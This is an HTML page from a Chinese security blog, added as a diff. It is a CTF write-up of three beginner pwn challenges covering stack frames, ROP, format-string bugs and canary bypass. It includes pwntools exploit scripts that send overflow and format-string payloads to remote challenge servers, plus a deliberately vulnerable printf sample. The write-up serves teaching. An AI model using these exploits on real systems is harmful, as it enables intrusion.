@@ -1,0 +1,527 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Ant Park">
+    <title>Pwn① - Ant Park</title>
+    <meta name="author" content="Yuan Shen">
+    
+    
+        <link rel="icon" href="http://yoursite.com/assets/images/yuan.png">
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuan Shen","sameAs":[],"image":"yuan.jpg"},"articleBody":"三道入门难度的PWN题，由蓝鲸安全平台提供。\n题目地址：https://pan.baidu.com/s/1X24ERGRhAx_Odnqap5xbFg\n\n\n背景一level2x86的知识点：函数栈帧，rop，pwntools\n函数栈帧\n栈：一种数据结构，具有先进后出的属性，在计算机中，有着许多段以栈形式管理的动态内存，因此，把计算机内的这一段也称为栈；\nESP：指向栈顶的指针；\nEBP：栈的基址指针；\n\n几乎所有函数被调用时，会在相应栈内形成一段固定的结构，那么我们来看一下函数调用时的汇编代码：\n\n\nCALL func时push一个返回地址（汇编CALL func的下一行）；\n向栈中保存上一个函数的ebp，并且设定新的ebp；\n开辟0x88的空间给被调用函数使用，也就是局部变量；\n\n在调用函数前，函数会先push被调用函数所需参数，注意 这时参数入栈的顺序；\n\n\n所以，只要我们控制了函数的返回地址，就可以说，我们控制流函数的走向，让他运行我们想要的函数（例如system（））；\n也就是说，只要找到栈溢出点，我们便可以利用此函数的栈区域，伪造一个新的函数栈帧来利用；\n\nROP\nRop全称为：（Return Oriented Programming）可以理解为，函数的返回地址。因为在调用一个函数的时候需要返回正确的主函数下一条地址，所以进行编译的时候会将这个地址放入到一个内存中并利用ret指令返回存储的地址继续执行程序。\n面向返回的编程，攻击者从已有的库或可执行文件内提取可用的代码片段，组成一个ROP链，从而拼接出我们想要的功能，这些片段指令都是以ret为结尾，用ret指令实现执行流的衔接。\n\n\nPwntools基本操作\n使用模板：\n\n12345from pwn import *r = remote('服务器ip或域名', 端口号)payload = '......'r.sendline(payload)r.interactive()\n\n常用模块\nrecv（）用来接收服务器返回的信息，以字符串形式返回\nrecvuntil（）用来控制条件，比如当接收到input字符串时再发送r.recvuntil(&#39;input&#39;) r.sendline(payload)\nELF（）  load elf文件例如：elf=ELF(&#39;/pwn&#39;)\nelf.symbols[‘write’]   获取函数地址\nelf.got[‘write’]      获取函数got表中的地址    \nelf.plt[‘write’]       获取函数plt表中的地址\n\n\np32（）p64（）：以32或64位 打包（pack）一个整数，自动转化成小端序；\nu32（）u64（）：以32或64位 解包（unpack）一个整数；\nshellcraft：各种写好的shell，例如shellcraft.sh()执行后可以达到system(&#39;/bin/sh&#39;)的效果；\nasm（）：一般配合shellcraft或者自己手写的汇编，asm()后，汇编代码会变成符合标准的字节码，使用方式asm(shellcraft.sh())；\n\n\n\n题目解析\n首先checksec level2x86，发现如下结果：32位程序，开启了NX（堆栈不可执行），没开启ALSR（地址随机化），随后更换IDA分析。\n\n\n\n左侧函数栏找到main函数，双击进入vulnerable函数，F5查看伪代码，下面分别是main函数和vulnerable函数，其中vulnerable函数内有危险函数read，可以读入0x100长度的字符串；\n\n\n\n双击变量名查看字符串在站内的位置，在左边的函数列表里可以看到system（）函数，同时搜索字符串后可以看到/bin/sh的存在；\n\n\n\n已知buf在-0x88的位置，而返回地址在+0x4的位置，中间的空余的栈空间是需要被填满才能进而覆盖返回地址的，而read函数读取后是从-0x88处开始向栈内存储字符串，所以我们可以确定填充长度为0x88+0x4；\n\n脚本如下：\n12345678910from pwn import *r = remote('39.107.92.230', 10003)elf = ELF('./level2x86')sys_addr = elf.symbols['system']  #system函数地址#print sys_addrsh_addr = 0x804A024     #/bin/sh字符串地址#0xdeadbeef为system('/bin/sh')函数执行后的返回地址，可以随意指定(主要是为了伪造函数栈帧)payload = 'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)r.sendline(payload)r.interactive()\n\n脚本的关键步骤为payload = &#39;a&#39; * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)\n填充\n覆盖返回地址为system函数，此时为了达到call效果，伪造了函数栈帧（0xdeadbeef）,此时0xdeadbeef就应为下一个我们希望执行的语句地址，在以后学习ROP链的时候进行组合。\n参数地址，也就是/bin/sh\n\n\n\n参考连接：\nhttp://docs.pwntools.com/en/stable/\n背景二police_academy的知识点：格式化字符串漏洞\n格式化字符串\n格式化字符串说明：利用%..将要输出或者读取的内容进行格式填充，相当于将一个字符串中间留空，要输入什么内容我们可以在一个循环或者输出语句后面进行定义和重组；\n例如：printf(&quot;Hello %s&quot;, &quot;world&quot;)将会把%s填充为后面加上的word；\n格式化说明符存在许多种不同的数据类型，可以利用不同的类型规定格式化字符串接受哪种类型的数据。\n常用的类型包括：\n%d – 十进制 – 输出十进制整数\n%s – 字符串 – 从内存中读取字符串 \n%x – 十六进制 – 输出十六进制数\n%c – 字符 – 输出字符\n%p – 指针 – 指针地址\n%n – 到目前为止所写的字符数\n\n\n可能存在格式化字符串漏洞函数 – fprintf，printf，sprint，snprintf，scanf 等等\n举个例子说明一下\n\n\n\n这段代码将接受的字符串作为参数，创建一个1024字符缓冲区，接着将字符串复制到缓冲区，最后调用两个printf函数格式化输出。\nprintf的格式化字符串漏洞更多使用来定位我们需要的函数返回地址，当程序做了一些保护，例如动态加载敏感函数，而我们没有办法获取到该函数的返回地址的时候我们就可以用printf的格式化字符串来获取当前程序中执行的某个函数或者变量或者缓冲区的地址了；\n而其他的例如scanf的漏洞大多还是直接利用没有边界导致读取过多字符的漏洞来进行利用；\n\n题目解析\n通过nc先连接地址进行测试，会让我们输入一个密码，随便输入一个提示错误；\n\n\n\n通过ida来逆向程序，非常简单的在一个strcmp函数中找到了密码比对的字符，也就是正确的密码。\n\n\n\n接下来我们通过这个密码登录后，选择一个编号后会输出对应的文件\n\n\n\n选择一个编号后会通过一个switch结构找到对应文件，并用print_record进行输出；\n文件名我们查询后是一个md5 加上.dat后缀名；\n而record函数中则会检测文件名的长度，要求必须是36位的长度（md5的32位加上4位后缀名）\n\n\n\n\n\n以上是题目的逻辑，那么该如何利用呢，也就是flag在哪呢，看到最后一个switch，它的v8是flag.txt但是如果不够长也就是v9为0的话总是会提示我们没有权限；\n\n\n\n那么现在有一个思路，就是让文件名长到超过v8的存储范围覆盖到v9或者利用别的循环，将文件名填充为flag.txt。但是无论如何我么肯定需要利用某一块的漏洞进行溢出覆盖了。\n\n题目一共接收了两次我们的输入，都是利用scanf格式接受。第一次是在输入密码的时候，第二次是在输入编号的时候；\n\n\n\n\n通常我们选择靠近要覆盖地址的区域进行溢出，但是我们看到其中的格式，%s为接受字符串，但是%d只能接受数字，也就是说我们只能利用接受密码的变量s1了。\n那么接下来计算地址，我们要覆盖的变量为：v8，而利用参数为s1，看看他们内存中的存储地址：\n\n\n\ns1为：-40~+10的位置\nV8为：-30~+20的位置\n\n但这只是静态程序中的定义，我们不知道运行之后两个变量对应的堆栈也就是相对的ebp是否相邻，于是利用gdb进行动态调试后查看两个变量的位置；\n\n\n\n\n我们看到，他们的确相差0x10个字符，也就是16个字符；\n\n接下来进行溢出计算，首先密码是必须的，也就是s1必须填充kaiokenx20这10个字符，所以我们想准确的覆盖v8还需要填充6个字符；\n\n在覆盖v8的时候要记住，有文件名长度检查，也就是长度要符合36，但是flag并没有md5加密文件名，我们从第6个提示能看出来；\n\n\n\n所以利用14个./来填充 + Flag.txt\n\n脚本如下：\n12345678910from pwn import *r = remote('39.107.92.230', 10004)r.recvuntil('Enter password to authentic yourself : ')r.sendline('kaiokenx20'+'A'*6+14*'./' + \"flag.txt\")r.recvuntil(':')r.sendline('8')r.interactive()\n背景三binary_200知识点：格式化字符串漏洞，canary保护\n格式化字符串\n接着上一道题，一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变模糊了。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求出入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会严格的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。\n示例程序：\n\n12345678#include &lt;stdio.h&gt;int main(void)&#123;    char a[100];    scanf(\"%s\",a);    printf(a);    return 1;&#125;\n\n假设输入为：AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x，发现输出的第7个数为41414141发现刚好是AAAA的ascii码，这也是我们输入的字符串开始的位置。\n\n\n\n堆栈中的数据也是这样子存储的。\n\n\n\nPrintf格式化字符串有另一个特性，$操作符，这个操作符可以输出指定位置的参数，而不需要多长输入格式标志了，这样我们直接输出了第6个位置的内存值；\n\n\n\n但是这里如果直接使用脚本来利用是有问题的。我们利用脚本来攻击这个程序\n\n\n\n当偏移为6的时候报了EOF的错\n\n\n\n我们想要读取的地址为0x08048000，因为是小端存储，我们发送的数据包第一个字节是地址最后一个字节也就是0x00所以发送失败了，所以需要增加一个偏移示意如下：\n\n\n\n成功读取地址\n\n\nCanary保护\nCanary是放置栈溢出的一种保护机制，从FS块内存的某个区域获取一个值存在栈中，类似于Cookie。当程序执行返回的时候，会对这个值进行校验，如果该值正确，程序正常执行返回，否则程序被判定为发生栈溢出，直接退出。\n为了防止发生信息泄露以及其他漏洞的利用，Canary使用\\x00对值进行截断，所以Canary的最低byte位为\\x00；\n\n\n\n我们可以把padding部分全部覆盖掉，然后按byte覆盖Canary的值。如果程序正常运行，则该byte的Canary值正确；若程序退出，则继续爆破该位Canary的值。或者如果有格式化字符串则可以读取这个值了。\n\n\n题目解析\n首先根据题目提示，看到了程序打开了保护，所以放到gdb中用checksec观察发现开启了CANNARY保护，那么也就需要找到canary的偏移位置了。\n\n\n\n在有printf格式化字符串的漏洞不需要去暴力破解canary，所以我们可以通过gdb找到格式化字符串与输入值的偏移。\n我们在printf上下断点（这时候能够看到我们输入的字符串在堆栈中的位置）\n\n\n\n\n接着运行函数，并输入一个简单值例如aaaa，并看到aaaa在堆栈的0xffffd020存入；\n\n\n\n接着我们看到了最后canary保护方式为：利用dex中获取的esp+3c的值与large gs:14h进行比较不相等则退出。那么我们就可以取出当前内存中的值（canary已经入栈）\n\n\n\nx/20wx   0xffffd020\n\n\n\n接着重新下断点，我们去到最终比较的值（赋值给edx那里）获取这次canary的值找到edx中canary的值为：0x93226e00；\n他们之间相差15个参数的长度，所以可以通过格式化字符串：%15$x获取这个值；\n\n脚本如下：\n123456789101112from pwn import *r = remote('172.104.78.53', 22002)func = 0x0804854dr.sendline('%15$x')canary = int(r.recv(), 16) #获取需要的canary的值payload = 'A'*40 + p32(canary) + 'B'*12 + p32(func)r.sendline(payload)r.interactive()\n总结通过这简单的三道题，成功复习了缓冲区溢出和格式化字符串漏洞的相关知识，以及如何绕过缓冲区保护机制之一的（Canary机制）。\n","dateCreated":"2019-01-13T10:05:30+08:00","dateModified":"2019-01-21T22:13:22+08:00","datePublished":"2019-01-13T10:05:30+08:00","description":"三道入门难度的PWN题，由蓝鲸安全平台提供。\n题目地址：https://pan.baidu.com/s/1X24ERGRhAx_Odnqap5xbFg","headline":"Pwn①","image":["https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg","https://ws3.sinaimg.cn/large/0069RVTdly1fv9d1artqxj31kw1z4kjp.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/01/13/Pwn①/"},"publisher":{"@type":"Organization","name":"Yuan Shen","sameAs":[],"image":"yuan.jpg","logo":{"@type":"ImageObject","url":"yuan.jpg"}},"url":"http://yoursite.com/2019/01/13/Pwn①/","keywords":"pwn, rop, pwntools","thumbnailUrl":"https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg"}</script>
+    <meta name="description" content="三道入门难度的PWN题，由蓝鲸安全平台提供。 题目地址：https://pan.baidu.com/s/1X24ERGRhAx_Odnqap5xbFg">
+<meta name="keywords" content="pwn,rop,pwntools">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="Pwn①">
+<meta property="og:url" content="http://yoursite.com/2019/01/13/Pwn①/index.html">
+<meta property="og:site_name" content="Ant Park">
+<meta property="og:description" content="三道入门难度的PWN题，由蓝鲸安全平台提供。 题目地址：https://pan.baidu.com/s/1X24ERGRhAx_Odnqap5xbFg">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fzdbikj0q1j31hq0bonem.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fzdbqe32w8j30ts0doq86.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzdbyiasjkj30ew0a2acd.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzdce9fqc9j30c204udig.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fzdch8zctmj30ku048777.jpg">
+<meta property="og:image" content="http://yoursite.com/Users/sy/Library/Application%20Support/typora-user-images/image-20190120205838372.png">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fze8cro6xaj30e408q0vk.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fze8nn10q4j30gy02wmxg.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fze8q2kvg7j30gy04wtbb.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fze8sf6oxdj30v20l6jt7.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fze9hmj832j30fm0dq0uo.jpg">
+<meta property="og:image" content="http://yoursite.com/Users/sy/Library/Application%20Support/typora-user-images/image-20190121155922729.png">
+<meta property="og:image" content="http://yoursite.com/Users/sy/Library/Application%20Support/typora-user-images/image-20190121155956539.png">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fze9q1f8dpj30pm03mdgb.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fze9v2hvx4j30jc0bkgo8.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fzea41xjitj30cm046aap.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fzea6jc7bkj30ko05qn3f.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fzeagm2ufbj30v407odga.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fzejqy812vj30pa02cdja.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79ly1fzeju2qb9aj30ke0aith5.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fzejx3f12bj30i60bstdf.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fzek01nu3wj30fw05uaei.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzek1c3x0wj30l601yab3.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzek49ar5mj30ys0ci10f.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzek6pgidxj30l605e42z.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fzeix28dg6j30c2084myh.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fzej30g8s7j30eg0he0z0.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fzedypushvj30ei07ajw0.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79ly1fzee1uklrsj30g006atcs.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzee27srmvj30mk02e778.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzee32e3y6j30ha068451.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzee6awlo3j30ou052tcn.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79ly1fzee6y2fzij30ko042jwd.jpg">
+<meta property="og:updated_time" content="2019-01-21T14:13:22.954Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwn①">
+<meta name="twitter:description" content="三道入门难度的PWN题，由蓝鲸安全平台提供。 题目地址：https://pan.baidu.com/s/1X24ERGRhAx_Odnqap5xbFg">
+<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tNc79ly1fzdbikj0q1j31hq0bonem.jpg">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://yoursite.com/assets/images/yuan.jpg"/>
+    
+    
+        <meta property="og:image" content="https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://ws2.sinaimg.cn/large/0069RVTdly1fv9d6x9yhjj30o60iqau7.jpg" />
+    
+    
+        <meta property="og:image" content="https://ws3.sinaimg.cn/large/0069RVTdly1fv9d1artqxj31kw1z4kjp.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://ws3.sinaimg.cn/large/0069RVTdly1fv9d1artqxj31kw1z4kjp.jpg" />
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-du2xmrqdqrl2ollgeiw050kpl6l4nbyz7bumjuurjgsxyopifvukebxc9lqe.min.css">
+    <!--STYLES END-->
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">Ant Park</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+            <img class="header-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a href="/#about">
+                    <img class="sidebar-profile-picture" src="/assets/images/yuan.jpg" alt="作者的图片"/>
+                </a>
+                <h4 class="sidebar-profile-name">Yuan Shen</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>author.bio</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="首页"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="分类"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="标签"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="归档"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+        <div class="post-header-cover
+                    text-center
+                    post-header-cover--full"
+             style="background-image:url('https://ws3.sinaimg.cn/large/0069RVTdly1fv9d1artqxj31kw1z4kjp.jpg');"
+             data-behavior="4">
+            
+        </div>
+
+            <div id="main" data-behavior="4"
+                 class="hasCover
+                        hasCoverMetaOut
+                        hasCoverCaption">
+                
+<article class="post">
+    
+        <span class="post-header-cover-caption caption">Leaky</span>
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            Pwn①
+        </h1>
+    
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>三道入门难度的PWN题，由蓝鲸安全平台提供。</p>
+<p>题目地址：<a href="https://pan.baidu.com/s/1X24ERGRhAx_Odnqap5xbFg" target="_blank" rel="noopener">https://pan.baidu.com/s/1X24ERGRhAx_Odnqap5xbFg</a></p>
+<a id="more"></a>
+<h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#背景一"><span class="toc-text">背景一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#函数栈帧"><span class="toc-text">函数栈帧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP"><span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwntools基本操作"><span class="toc-text">Pwntools基本操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目解析"><span class="toc-text">题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#背景二"><span class="toc-text">背景二</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#格式化字符串"><span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目解析-1"><span class="toc-text">题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#背景三"><span class="toc-text">背景三</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#格式化字符串-1"><span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary保护"><span class="toc-text">Canary保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目解析-2"><span class="toc-text">题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+<h2 id="背景一"><a href="#背景一" class="headerlink" title="背景一"></a>背景一</h2><p><code>level2x86</code>的知识点：函数栈帧，rop，pwntools</p>
+<h3 id="函数栈帧"><a href="#函数栈帧" class="headerlink" title="函数栈帧"></a>函数栈帧</h3><ul>
+<li>栈：一种数据结构，具有先进后出的属性，在计算机中，有着许多段以栈形式管理的动态内存，因此，把计算机内的这一段也称为栈；</li>
+<li>ESP：指向栈顶的指针；</li>
+<li>EBP：栈的基址指针；</li>
+</ul>
+<p>几乎所有函数被调用时，会在相应栈内形成一段固定的结构，那么我们来看一下函数调用时的汇编代码：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzdbikj0q1j31hq0bonem.jpg" alt=""></p>
+<ul>
+<li>CALL func时push一个返回地址（汇编CALL func的下一行）；</li>
+<li>向栈中保存上一个函数的ebp，并且设定新的ebp；</li>
+<li>开辟0x88的空间给被调用函数使用，也就是局部变量；</li>
+</ul>
+<p>在调用函数前，函数会先push被调用函数所需参数，<strong>注意</strong> 这时参数入栈的顺序；</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fzdbqe32w8j30ts0doq86.jpg" alt=""></p>
+<ul>
+<li>所以，只要我们控制了函数的返回地址，就可以说，我们控制流函数的走向，让他运行我们想要的函数（例如system（））；</li>
+<li>也就是说，只要找到栈溢出点，我们便可以利用此函数的栈区域，伪造一个新的函数栈帧来利用；</li>
+</ul>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><ul>
+<li>Rop全称为：（Return Oriented Programming）可以理解为，函数的返回地址。因为在调用一个函数的时候需要返回正确的主函数下一条地址，所以进行编译的时候会将这个地址放入到一个内存中并利用ret指令返回存储的地址继续执行程序。</li>
+<li>面向返回的编程，攻击者从已有的库或可执行文件内提取可用的代码片段，组成一个ROP链，从而拼接出我们想要的功能，这些片段指令都是以ret为结尾，用ret指令实现执行流的衔接。</li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzdbyiasjkj30ew0a2acd.jpg" alt=""></p>
+<h3 id="Pwntools基本操作"><a href="#Pwntools基本操作" class="headerlink" title="Pwntools基本操作"></a>Pwntools基本操作</h3><ul>
+<li>使用模板：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'服务器ip或域名'</span>, 端口号)</span><br><span class="line">payload = <span class="string">'......'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>常用模块<ul>
+<li>recv（）用来接收服务器返回的信息，以字符串形式返回</li>
+<li>recvuntil（）用来控制条件，比如当接收到input字符串时再发送<code>r.recvuntil(&#39;input&#39;) r.sendline(payload)</code></li>
+<li>ELF（）  load elf文件例如：<code>elf=ELF(&#39;/pwn&#39;)</code><ul>
+<li>elf.symbols[‘write’]   获取函数地址</li>
+<li>elf.got[‘write’]      获取函数got表中的地址    </li>
+<li>elf.plt[‘write’]       获取函数plt表中的地址</li>
+</ul>
+</li>
+<li>p32（）p64（）：以32或64位 打包（pack）一个整数，自动转化成小端序；</li>
+<li>u32（）u64（）：以32或64位 解包（unpack）一个整数；</li>
+<li>shellcraft：各种写好的shell，例如<code>shellcraft.sh()</code>执行后可以达到<code>system(&#39;/bin/sh&#39;)</code>的效果；</li>
+<li>asm（）：一般配合shellcraft或者自己手写的汇编，asm()后，汇编代码会变成符合标准的字节码，使用方式<code>asm(shellcraft.sh())</code>；</li>
+</ul>
+</li>
+</ul>
+<h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><ul>
+<li>首先<code>checksec level2x86</code>，发现如下结果：32位程序，开启了NX（堆栈不可执行），没开启ALSR（地址随机化），随后更换IDA分析。</li>
+</ul>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fzdce9fqc9j30c204udig.jpg" alt=""></p>
+<ul>
+<li>左侧函数栏找到main函数，双击进入vulnerable函数，F5查看伪代码，下面分别是main函数和vulnerable函数，其中vulnerable函数内有危险函数<strong>read</strong>，可以读入0x100长度的字符串；</li>
+</ul>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fzdch8zctmj30ku048777.jpg" alt=""></p>
+<ul>
+<li>双击变量名查看字符串在站内的位置，在左边的函数列表里可以看到system（）函数，同时搜索字符串后可以看到<code>/bin/sh</code>的存在；</li>
+</ul>
+<p><img src="/Users/sy/Library/Application Support/typora-user-images/image-20190120205838372.png" alt="image-20190120205838372"></p>
+<ul>
+<li>已知buf在<strong>-0x88</strong>的位置，而返回地址在<strong>+0x4</strong>的位置，中间的空余的栈空间是需要被填满才能进而覆盖返回地址的，而read函数读取后是从-0x88处开始向栈内存储字符串，所以我们可以确定填充长度为<strong>0x88+0x4</strong>；</li>
+</ul>
+<p>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'39.107.92.230'</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level2x86'</span>)</span><br><span class="line">sys_addr = elf.symbols[<span class="string">'system'</span>]  <span class="comment">#system函数地址</span></span><br><span class="line"><span class="comment">#print sys_addr</span></span><br><span class="line">sh_addr = <span class="number">0x804A024</span>     <span class="comment">#/bin/sh字符串地址</span></span><br><span class="line"><span class="comment">#0xdeadbeef为system('/bin/sh')函数执行后的返回地址，可以随意指定(主要是为了伪造函数栈帧)</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>脚本的关键步骤为<code>payload = &#39;a&#39; * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)</code><ul>
+<li>填充</li>
+<li>覆盖返回地址为system函数，此时为了达到call效果，伪造了函数栈帧（0xdeadbeef）,此时<code>0xdeadbeef</code>就应为下一个我们希望执行的语句地址，在以后学习ROP链的时候进行组合。</li>
+<li>参数地址，也就是<code>/bin/sh</code></li>
+</ul>
+</li>
+</ul>
+<p>参考连接：</p>
+<p><a href="http://docs.pwntools.com/en/stable/" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/</a></p>
+<h2 id="背景二"><a href="#背景二" class="headerlink" title="背景二"></a>背景二</h2><p><code>police_academy</code>的知识点：格式化字符串漏洞</p>
+<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><ul>
+<li>格式化字符串说明：利用<code>%..</code>将要输出或者读取的内容进行格式填充，相当于将一个字符串中间留空，要输入什么内容我们可以在一个循环或者输出语句后面进行定义和重组；</li>
